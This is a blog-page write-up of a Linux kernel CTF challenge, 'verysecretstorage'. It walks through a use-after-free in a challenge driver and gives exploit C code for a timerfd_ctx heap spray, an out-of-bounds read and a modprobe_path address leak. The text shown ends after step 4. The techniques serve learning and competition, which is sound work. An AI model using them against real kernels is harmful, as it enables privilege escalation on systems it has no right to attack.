<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Writeup for verysecretstorage kernel pwn at AYCEP 2024 CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="AYCEP 2024 - verysecretstorage">
<meta property="og:url" content="https://fern89.github.io/2024/12/19/verysecretstorage/index.html">
<meta property="og:site_name" content="fern&#39;s blog">
<meta property="og:description" content="Writeup for verysecretstorage kernel pwn at AYCEP 2024 CTF">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-12-19T05:08:27.000Z">
<meta property="article:modified_time" content="2025-09-16T15:09:52.644Z">
<meta property="article:author" content="fern">
<meta property="article:tag" content="ctf">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>AYCEP 2024 - verysecretstorage</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<!-- hexo injector head_end start -->
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/05/07/mamba/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/11/02/intro-to-hvnc/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://fern89.github.io/2024/12/19/verysecretstorage/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://fern89.github.io/2024/12/19/verysecretstorage/&text=AYCEP 2024 - verysecretstorage"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://fern89.github.io/2024/12/19/verysecretstorage/&title=AYCEP 2024 - verysecretstorage"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://fern89.github.io/2024/12/19/verysecretstorage/&is_video=false&description=AYCEP 2024 - verysecretstorage"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=AYCEP 2024 - verysecretstorage&body=Check out this article: https://fern89.github.io/2024/12/19/verysecretstorage/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://fern89.github.io/2024/12/19/verysecretstorage/&title=AYCEP 2024 - verysecretstorage"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://fern89.github.io/2024/12/19/verysecretstorage/&title=AYCEP 2024 - verysecretstorage"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://fern89.github.io/2024/12/19/verysecretstorage/&title=AYCEP 2024 - verysecretstorage"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://fern89.github.io/2024/12/19/verysecretstorage/&title=AYCEP 2024 - verysecretstorage"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://fern89.github.io/2024/12/19/verysecretstorage/&name=AYCEP 2024 - verysecretstorage&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://fern89.github.io/2024/12/19/verysecretstorage/&t=AYCEP 2024 - verysecretstorage"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">2.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Data-structures"><span class="toc-number">2.1.</span> <span class="toc-text">Data structures</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#box"><span class="toc-number">2.1.1.</span> <span class="toc-text">box</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DO-CREATE"><span class="toc-number">2.2.</span> <span class="toc-text">DO_CREATE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DO-READ"><span class="toc-number">2.3.</span> <span class="toc-text">DO_READ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DO-WRITE"><span class="toc-number">2.4.</span> <span class="toc-text">DO_WRITE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DO-RESIZE"><span class="toc-number">2.5.</span> <span class="toc-text">DO_RESIZE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DO-DELETE"><span class="toc-number">2.6.</span> <span class="toc-text">DO_DELETE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-0-Setup"><span class="toc-number">3.</span> <span class="toc-text">Step 0: Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-1-UAF"><span class="toc-number">4.</span> <span class="toc-text">Step 1: UAF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-2-Heap-spraying-with-timerfd-ctx"><span class="toc-number">5.</span> <span class="toc-text">Step 2: Heap spraying with timerfd_ctx</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-3-Modifying-note-size-with-UAF"><span class="toc-number">6.</span> <span class="toc-text">Step 3: Modifying note_size with UAF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-4-Leaking-modprobe-path-address"><span class="toc-number">7.</span> <span class="toc-text">Step 4: Leaking modprobe_path address</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-5-Setting-note-addr-to-modprobe-path"><span class="toc-number">8.</span> <span class="toc-text">Step 5: Setting note_addr to modprobe_path</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-6-Win-flag"><span class="toc-number">9.</span> <span class="toc-text">Step 6: Win flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-7-Running-the-exploit"><span class="toc-number">10.</span> <span class="toc-text">Step 7: Running the exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">11.</span> <span class="toc-text">Conclusion</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        AYCEP 2024 - verysecretstorage
    </h1>



    <div class="meta">
      fern
      
    <div class="postdate">
      
        <time datetime="2024-12-19T05:08:27.000Z" class="dt-published" itemprop="datePublished">2024-12-19</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/ctf/" rel="tag">ctf</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>Recently, I participated in the AYCEP 2024 CTF, and got first place. In the CTF, there was this pretty interesting kernel pwn challenge by <a target="_blank" rel="noopener" href="https://kaligulaarmblessed.github.io/">Kaligula</a>, verysecretstorage. This was my favourite challenge in the CTF, and also happens to be the very first kernel pwn I attempted and solved in a CTF! While the intended (and much shorter!) solution uses <code>subprocess_info</code>, which nicely fits into the kmalloc-96 cache, I did not know about it at the time of the CTF, so I used an alternative pathway with <code>timerfd_ctx</code> instead for kASLR leak.</p>
<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>Note that the below code is abridged for brevity, if you wish to view full source, can download <a href="/media/verysecretstorage/dist.zip">here</a>.</p>
<h3 id="Data-structures"><a href="#Data-structures" class="headerlink" title="Data structures"></a>Data structures</h3><h4 id="box"><a href="#box" class="headerlink" title="box"></a>box</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">box</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">0x50</span>];</span><br><span class="line">    <span class="type">uint64_t</span> note_size; </span><br><span class="line">    <span class="type">uint64_t</span> note_addr;</span><br><span class="line">&#125;;  <span class="comment">// 0x60 - kmalloc-96</span></span><br></pre></td></tr></table></figure>
<h3 id="DO-CREATE"><a href="#DO-CREATE" class="headerlink" title="DO_CREATE"></a>DO_CREATE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> DO_CREATE: &#123; </span><br><span class="line">    box = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> box), GFP_KERNEL);</span><br><span class="line">    ret = copy_from_user(buf, (<span class="type">void</span> __user *) user_data.name_addr, <span class="number">0x50</span><span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;box-&gt;name, buf, <span class="number">0x50</span><span class="number">-1</span>); </span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">if</span> (user_data.note_size != <span class="number">0</span>) &#123;</span><br><span class="line">        note = kmalloc(user_data.note_size, GFP_KERNEL);</span><br><span class="line">        box-&gt;note_addr = (<span class="type">uint64_t</span>) note; </span><br><span class="line">        box-&gt;note_size = user_data.note_size;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Copy information to the note</span></span><br><span class="line">        ret = copy_from_user(buf, (<span class="type">void</span> __user *) user_data.note_addr, box-&gt;note_size);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="type">void</span> *) note, buf, box-&gt;note_size<span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    &#125;</span><br><span class="line">    box_array[box_count] = box; </span><br><span class="line">    box_count = box_count + <span class="number">1</span>; </span><br><span class="line">    mutex_unlock(&amp;storage_mutex); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Nothing too important here, just create a new <code>box</code> structure and allocate it in kmalloc-96.</p>
<h3 id="DO-READ"><a href="#DO-READ" class="headerlink" title="DO_READ"></a>DO_READ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> DO_READ: &#123;</span><br><span class="line">    box = box_array[user_data.idx]; </span><br><span class="line">    <span class="built_in">memcpy</span>(buf, &amp;box-&gt;name, <span class="number">0x50</span><span class="number">-1</span>); </span><br><span class="line">    ret = copy_to_user((<span class="type">void</span> __user *)user_data.name_addr, buf, <span class="number">0x50</span><span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> (box-&gt;note_addr != <span class="number">0</span> &amp;&amp; box-&gt;note_addr != <span class="number">0x10</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0x0</span>, <span class="keyword">sizeof</span>(buf)); </span><br><span class="line">        <span class="built_in">memcpy</span>(buf, (<span class="type">void</span> *)box-&gt;note_addr, box-&gt;note_size<span class="number">-1</span>); </span><br><span class="line">        ret = copy_to_user((<span class="type">void</span> __user *)user_data.note_addr, buf, box-&gt;note_size); </span><br><span class="line">    &#125;</span><br><span class="line">    mutex_unlock(&amp;storage_mutex); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Just read the note and name of the box.</p>
<h3 id="DO-WRITE"><a href="#DO-WRITE" class="headerlink" title="DO_WRITE"></a>DO_WRITE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> DO_WRITE: &#123;</span><br><span class="line">    box = box_array[user_data.idx]; </span><br><span class="line">    ret = copy_from_user(&amp;box-&gt;name, (<span class="type">void</span> __user *) user_data.name_addr, <span class="number">0x50</span><span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> (box-&gt;note_size != <span class="number">0</span> &amp;&amp; box-&gt;note_addr != <span class="number">0</span> &amp;&amp; box-&gt;note_addr != <span class="number">0x10</span>) &#123;</span><br><span class="line">        ret = copy_from_user((<span class="type">void</span> *)box-&gt;note_addr, (<span class="type">void</span> __user *) user_data.note_addr, box-&gt;note_size);</span><br><span class="line">    &#125;</span><br><span class="line">    mutex_unlock(&amp;storage_mutex); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Write to name and note.</p>
<h3 id="DO-RESIZE"><a href="#DO-RESIZE" class="headerlink" title="DO_RESIZE"></a>DO_RESIZE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> DO_RESIZE: &#123;</span><br><span class="line">    box = box_array[user_data.idx]; </span><br><span class="line">    ret = copy_from_user(&amp;box-&gt;name, (<span class="type">void</span> __user *) user_data.name_addr, <span class="number">0x50</span><span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> (user_data.note_size != <span class="number">0</span>) &#123;</span><br><span class="line">        kfree((<span class="type">void</span> *)box-&gt;note_addr);</span><br><span class="line">        note = kmalloc(user_data.note_size, GFP_KERNEL); </span><br><span class="line">        box-&gt;note_addr = (<span class="type">uint64_t</span>)note; </span><br><span class="line">        box-&gt;note_size = user_data.note_size; </span><br><span class="line">        ret = copy_from_user(note, (<span class="type">void</span> __user *) user_data.note_addr, user_data.note_size);</span><br><span class="line">    &#125;</span><br><span class="line">    mutex_unlock(&amp;storage_mutex); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Insert a note into a box, with your choice of size and data.</p>
<h3 id="DO-DELETE"><a href="#DO-DELETE" class="headerlink" title="DO_DELETE"></a>DO_DELETE</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> DO_DELETE: &#123;</span><br><span class="line">    box = box_array[user_data.idx]; </span><br><span class="line">    <span class="keyword">if</span> (box-&gt;note_addr != <span class="number">0</span> &amp;&amp; box-&gt;note_addr != <span class="number">0x10</span>) &#123;</span><br><span class="line">        kfree((<span class="type">void</span> *)box-&gt;note_addr); </span><br><span class="line">        box-&gt;note_addr = <span class="number">0</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    kfree(box); </span><br><span class="line">    mutex_unlock(&amp;storage_mutex); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Finally a vulnerability! Note how the box pointer is not cleared and left dangling. This will be the basis of our exploit.</p>
<h2 id="Step-0-Setup"><a href="#Step-0-Setup" class="headerlink" title="Step 0: Setup"></a>Step 0: Setup</h2><p>Before exploiting, we usually have some code to set the CPU affinity of the process - this is to ensure we stay on a single core, and hence a single cache within the kernel, making our lives far easier.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Setting CPU affinity...&quot;</span>);</span><br><span class="line"><span class="type">cpu_set_t</span> cpu;</span><br><span class="line">CPU_ZERO(&amp;cpu);</span><br><span class="line">CPU_SET(<span class="number">0</span>, &amp;cpu);</span><br><span class="line"><span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">cpu_set_t</span>), &amp;cpu)) &#123;</span><br><span class="line">    perror(<span class="string">&quot;sched_setaffinity&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Step-1-UAF"><a href="#Step-1-UAF" class="headerlink" title="Step 1: UAF"></a>Step 1: UAF</h2><p>First, we want to create 2 boxes, and free one of them. This leaves a freed box (we will refer to this box as box 1 from now on), aka a victim box that we can attack the structure of to gain our kASLR leak and arbitrary write later on.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Creating 2 boxes...&quot;</span>);</span><br><span class="line"><span class="type">int</span> fd = open(DEVICE_PATH, O_WRONLY);</span><br><span class="line"><span class="type">char</span> name[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> leaks[<span class="number">0x600</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">REQ req;</span><br><span class="line">req.note_size = <span class="number">0x100</span>;</span><br><span class="line">req.name_addr = name;</span><br><span class="line">req.note_addr = leaks;</span><br><span class="line"></span><br><span class="line">ioctl(fd, CREATE, &amp;req);</span><br><span class="line">ioctl(fd, CREATE, &amp;req);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Deleting box 1...&quot;</span>);</span><br><span class="line">req.idx = <span class="number">1</span>;</span><br><span class="line">ioctl(fd, DELETE, &amp;req);</span><br></pre></td></tr></table></figure>
<p>Note that the note_addr pointer in box 1 is cleared after deleting it.</p>
<h2 id="Step-2-Heap-spraying-with-timerfd-ctx"><a href="#Step-2-Heap-spraying-with-timerfd-ctx" class="headerlink" title="Step 2: Heap spraying with timerfd_ctx"></a>Step 2: Heap spraying with timerfd_ctx</h2><p>Now that we have the freed box, we want to repopulate the <code>note_addr</code> pointer within box 1, and have it placed right before a <code>timerfd_ctx</code> object. This is so that later on, when we change <code>note_size</code> within box 1, we can perform an out-of-bounds read into the <code>timerfd_ctx</code> object, which will give us a kASLR leak!</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Spraying timerfd_ctx objects in kmalloc-256...&quot;</span>);</span><br><span class="line"><span class="type">size_t</span> timer_fds[<span class="number">500</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">itimerspec</span> <span class="title">its</span>;</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">500</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">250</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Inserting new note in box 1, kmalloc-256...&quot;</span>);</span><br><span class="line">        ioctl(fd, RESIZE, &amp;req);</span><br><span class="line">    &#125;</span><br><span class="line">    timer_fds[i] = timerfd_create(CLOCK_REALTIME, <span class="number">0</span>);</span><br><span class="line">    its.it_value.tv_sec = <span class="number">1</span>;</span><br><span class="line">    its.it_value.tv_nsec = <span class="number">0</span>;</span><br><span class="line">    its.it_interval.tv_sec = <span class="number">1</span>;</span><br><span class="line">    its.it_interval.tv_nsec = <span class="number">0</span>;</span><br><span class="line">    timerfd_settime(timer_fds[i], <span class="number">0</span>, &amp;its, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Sprayed objects! Waiting for objects to populate...&quot;</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<p>The structure of the <code>timerfd_ctx</code> object is not too critical. Just note that it contains a pointer to the kernel, a region which is <strong>unaffected</strong> by FG-kASLR! As <code>modprobe_path</code>, which we will be overriding later to get flag, is also unaffected by FG-kASLR, this is perfect for us.<br>After the CTF, I also realized that since <code>CONFIG_SLAB_FREELIST_RANDOM</code> is not set, we do not actually need to spray the heap, instead, a single allocation of <code>timerfd_ctx</code> will be sufficient. However, there is no harm in spraying the heap, and it increases the fengshui of your exploit :D.</p>
<h2 id="Step-3-Modifying-note-size-with-UAF"><a href="#Step-3-Modifying-note-size-with-UAF" class="headerlink" title="Step 3: Modifying note_size with UAF"></a>Step 3: Modifying note_size with UAF</h2><p>Now, we need to change the <code>note_size</code> of box 1. This allows us to obtain an OOB read into <code>timerfd_ctx</code>, and hence obtain heap leak.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Allocating note of size 0x58 in box 0 to fit in kmalloc-96...&quot;</span>);</span><br><span class="line">req.idx = <span class="number">0</span>;</span><br><span class="line">req.note_size = <span class="number">0x58</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> box[<span class="number">12</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">box[<span class="number">10</span>] = <span class="number">0x200</span>;</span><br><span class="line">req.note_addr = box;</span><br><span class="line">ioctl(fd, RESIZE, &amp;req);</span><br><span class="line"><span class="comment">//item0&#x27;s note now has item1</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Box 0&#x27;s note now contains pointer to box 1! Box 1 note_size faked to 0x200, ready for OOB read&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>You may wonder why we use 0x58 instead of 0x60 for the fake box 1 object, as both sizes still go to kmalloc-96. This is so that we do not touch the <code>note_addr</code> field of box 1, which we cannot repair as we lack a heap leak. So now, the heap should look like this:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">note_addr   note_addr + 0x100</span><br><span class="line">|           |</span><br><span class="line">V           V</span><br><span class="line">-----------------------------</span><br><span class="line">| our note  | timerfd_ctx   |</span><br><span class="line">-----------------------------</span><br></pre></td></tr></table></figure>

<h2 id="Step-4-Leaking-modprobe-path-address"><a href="#Step-4-Leaking-modprobe-path-address" class="headerlink" title="Step 4: Leaking modprobe_path address"></a>Step 4: Leaking modprobe_path address</h2><p>As mentioned, <code>modprobe_path</code> address is unaffected by FG-kASLR (ie constant offset from kernel base, standard kASLR still applies), so is the address present in <code>timerfd_ctx</code>. Hence, the address we get from our OOB read will be at a constant offset to <code>modprobe_path</code>!</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Leaking modprobe_path address...&quot;</span>);</span><br><span class="line">req.idx = <span class="number">1</span>;</span><br><span class="line">req.note_addr = leaks;</span><br><span class="line">ioctl(fd, READ, &amp;req);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> mpp = leaks[<span class="number">37</span>] + <span class="number">0x1839180</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Leaked modprobe_path address: %p\n&quot;</span>, mpp);</span><br></pre></td></tr></table></figure>
<p>We can determine the offset of address present in <code>timerfd_ctx</code> to be 37 through printing all addresses leaked by our OOB read (too lazy to GDB it).</p>
